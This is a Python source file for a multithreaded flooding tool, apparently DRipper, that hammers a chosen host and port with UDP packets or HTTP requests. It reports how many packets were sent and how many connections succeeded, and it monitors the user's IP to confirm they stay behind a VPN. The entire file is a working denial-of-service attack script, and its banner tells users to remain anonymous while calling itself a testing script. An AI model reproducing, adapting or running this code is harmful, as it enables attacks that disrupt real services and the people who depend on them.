import os
import random
import socket
import string
import signal
import sys
import threading
import time
import urllib.request
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from optparse import OptionParser


# Constants
USAGE = 'Usage: python %prog [options] arg'
EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = f"\033[91mThere are no successful connections more than 2 min. " \
                                      f"Check your VPN or change host/port.\033[0m"

lock = threading.Lock()


@dataclass
class Context:
    """Class for passing a context to a parallel processes."""
    # Input params
    host: str = ''
    port: int = 80
    threads: int = 100
    max_random_packet_len: int = 0
    random_packet_len: bool = False
    attack_method: str = None
    protocol: str = 'http://'
    url: str = None

    # Internal vars
    user_agents: list = None
    base_headers: list = None
    headers = None

    # Statistic
    start_time: datetime = None
    start_ip: str = ''
    packets_sent: int = 0
    connections_success: int = 0
    connections_success_prev: int = 0
    connections_failed: int = 0
    connections_check_time: int = 0
    errors: list[str] = field(default_factory=list)

    cpu_count: int = 1
    show_statistics: bool = False
    current_ip = None
    getting_ip: bool = False


def init_context(_ctx, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.port = args[0].port
    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"

    _ctx.threads = args[0].threads

    _ctx.attack_method = str(args[0].attack_method).lower()
    _ctx.random_packet_len = bool(args[0].random_packet_len)
    _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
    _ctx.cpu_count = max(os.cpu_count(), 1)  # to avoid situation when vCPU might be 0

    _ctx.user_agents = readfile('useragents.txt')
    _ctx.base_headers = readfile('headers.txt')
    _ctx.headers = set_headers_dict(_ctx.base_headers)
    _ctx.start_time = datetime.now()


def readfile(filename: str):
    """Read string from file."""
    file = open(filename, "r")
    content = file.readlines()
    file.close()

    return content


def set_headers_dict(base_headers: list[str]):
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def get_random_string(len_from, len_to):
    """Random string with different length"""
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp(_ctx: Context):
    i = 1
    while True:
        extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
        packet = f'GET / HTTP/1.1' \
                 f'\nHost: {_ctx.host}' \
                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                 f'\n{_ctx.base_headers[0]}' \
                 f'\n\n{extra_data}'.encode('utf-8')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            sock.sendto(packet, (_ctx.host, _ctx.port))
        except socket.gaierror:
            if GETTING_SERVER_IP_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(GETTING_SERVER_IP_ERROR_MSG)
        else:
            if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
                _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
            _ctx.packets_sent += 1
            # print('\033[92m Packet was sent \033[0;0m')
        sock.close()

        if _ctx.port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host, args=[_ctx])
                thread.daemon = True
                thread.start()

        lock.acquire()
        if not _ctx.show_statistics:
            thread = threading.Thread(target=show_statistics, args=[_ctx])
            thread.daemon = True
            thread.start()
        lock.release()
        time.sleep(.01)


def down_it_http(_ctx: Context):
    while True:
        http_headers = _ctx.headers
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            urllib.request.urlopen(
                urllib.request.Request(_ctx.url, headers=http_headers))
        except:
            _ctx.connections_failed += 1
        else:
            _ctx.connections_success += 1
            # print('\033[92m HTTP-Request was done \033[0;0m')

        _ctx.packets_sent += 1

        if not _ctx.show_statistics:
            _ctx.show_statistics = True
            show_statistics(_ctx)
            _ctx.show_statistics = False

        time.sleep(.01)


def logo():
    print(''' \033[0;95m

██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible.

Please, make sure you are ANONYMOUS!
    \033[0m ''')


def usage(parser):
    """Wrapper for Logo with help."""
    logo()
    parser.print_help()
    sys.exit()


def parse_args(parser):
    """Initialize command line arguments parser and parse CLI arguments."""
    parser_add_options(parser)

    return parser.parse_args()


def parser_add_options(parser):
    """Add options to a parser."""
    parser.add_option('-p', '--port',
                      dest='port', type='int', default=80,
                      help='port (default: 80)')
    parser.add_option('-t', '--threads',
                      dest='threads', type='int', default=100,
                      help='threads (default: 100)')
    parser.add_option('-r', '--random_len',
                      dest='random_packet_len', type='int', default=1,
                      help='Send random packets with random length (default: 1')
    parser.add_option('-l', '--max_random_packet_len',
                      dest='max_random_packet_len', type='int', default=48,
                      help='Max random packets length (default: 48)')
    parser.add_option('-m', '--method',
                      dest='attack_method', type='str', default='udp',
                      help='Attack method: udp (default), http')
    parser.add_option('-s', '--server',
                      dest='host',
                      help='Attack to server IP')


def check_host(host):
    """Check Server IP."""
    error_msg = "\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m"
    if not host:
        print(error_msg)
        exit(1)

    try:
        socket.gethostbyname(host)
    except:
        print(error_msg)
        exit(1)


def connect_host(_ctx: Context):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((_ctx.host, _ctx.port))
    except:
        _ctx.connections_failed += 1
    else:
        _ctx.connections_success += 1


def get_first_ip_part(ip: str) -> str:
    parts = ip.split('.')
    if len(parts) > 1:
        return f"{parts[0]}.*.*.*"
    else:
        return parts[0]


def show_info(_ctx: Context):
    """Prints attack info to console."""
    logo()

    my_ip_masked = get_first_ip_part(_ctx.start_ip)
    is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len

    your_ip = f'\033[94m{my_ip_masked}\033[0m'
    check_vpn = f'\033[91mIP was changed, check VPN (current IP: {my_ip_masked})\033[0m' if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
    target_host = f'\033[94m{_ctx.host}:{_ctx.port}\033[0m'
    load_method = f'\033[94m{str(_ctx.attack_method).upper()}\033[0m'
    thread_pool = f'\033[94m{_ctx.threads}\033[0m'
    available_cpu = f'\033[94m{_ctx.cpu_count}\033[0m'
    rnd_packet_len = f'\033[94mYES\033[0m' if is_random_packet_len else f'\033[94mNO\033[0m'
    max_rnd_packet_len = f'\033[94m{_ctx.max_random_packet_len}\033[0m' if is_random_packet_len else f'\033[94mNOT REQUIRED\033[0m'

    print('------------------------------------------------------')
    print(f'Start time:                 {_ctx.start_time.strftime("%Y-%m-%d %H:%M:%S")}')
    print(f'Your IP:                    {your_ip} {check_vpn}')
    print(f'Host:                       {target_host}')
    print(f'Load Method:                {load_method}')
    print(f'Threads:                    {thread_pool}')
    print(f'vCPU count:                 {available_cpu}')
    print(f'Random Packet Length:       {rnd_packet_len}')
    print(f'Max Random Packet Length:   {max_rnd_packet_len}')
    print('------------------------------------------------------')

    sys.stdout.flush()


def show_statistics(_ctx: Context):
    """Prints statistics to console."""
    _ctx.show_statistics = True

    lock.acquire()
    if not _ctx.getting_ip:
        t = threading.Thread(target=set_current_ip, args=[_ctx])
        t.start()
    lock.release()

    check_successful_connections(_ctx)
    # cpu_load = get_cpu_load()

    print("\033c")
    show_info(_ctx)

    connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
    connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'

    curr_time = datetime.now() - _ctx.start_time

    print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
    # print(f'CPU Load Average:           {cpu_load}')
    print(f'Packets Sent:               {_ctx.packets_sent}')
    print(f'Connection Success:         {connections_success}')
    print(f'Connection Failed:          {connections_failed}')
    print('------------------------------------------------------')

    if _ctx.errors:
        print('\n\n')
    for error in _ctx.errors:
        print(f"\033[91m{error}\033[0;0m\n")
        print('\007')

    sys.stdout.flush()
    time.sleep(3)
    _ctx.show_statistics = False


def get_cpu_load():
    if os.name == 'nt':
        pipe = subprocess.Popen("wmic cpu get loadpercentage", stdout=subprocess.PIPE)
        out = pipe.communicate()[0].decode('utf-8')
        out = out.replace('LoadPercentage', '').strip()
        return f"{out}%"
    else:
        load1, load5, load15 = os.getloadavg()
        cpu_usage = (load15 / os.cpu_count()) * 100
        return f"{cpu_usage:.2f}%"


def create_thread_pool(_ctx: Context) -> list:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def get_current_ip():
    """Gets user IP."""
    current_ip = "No info"
    try:
        current_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    except:
        pass

    return current_ip


def set_current_ip(_ctx: Context):
    """Sets current IP."""
    _ctx.getting_ip = True
    _ctx.current_ip = get_current_ip()
    _ctx.getting_ip = False


def check_successful_connections(_ctx: Context):
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
    if _ctx.connections_success == _ctx.connections_success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
    else:
        _ctx.connections_check_time = curr_ms
        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)


def validate_input(args):
    """Validates input params."""
    if int(args.port) < 0:
        print("\033[91mWrong port number.\033[0m")
        return False

    if int(args.threads) < 1:
        print("\033[91mWrong threads number.\033[0m\n")
        return False

    if args.attack_method not in ('udp', 'http'):
        print("\033[91mWrong attack type. Possible options: udp, http.\033[0m\n")
        return False

    return True


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        usage(parser)

    init_context(_ctx, args)
    current_ip = get_current_ip()
    if current_ip:
        _ctx.start_ip = current_ip
    else:
        _ctx.start_ip = "\033[91mCan't get your IP. Check internet connection.\033[0m"

    check_host(_ctx.host)
    connect_host(_ctx)

    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
    print("\033[94mPlease wait...\033[0m")

    time.sleep(1)
    show_info(_ctx)

    _ctx.connections_check_time = time.time_ns()

    create_thread_pool(_ctx)

    while True:
        time.sleep(1)


# Context should be in global scope
_ctx = Context()


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
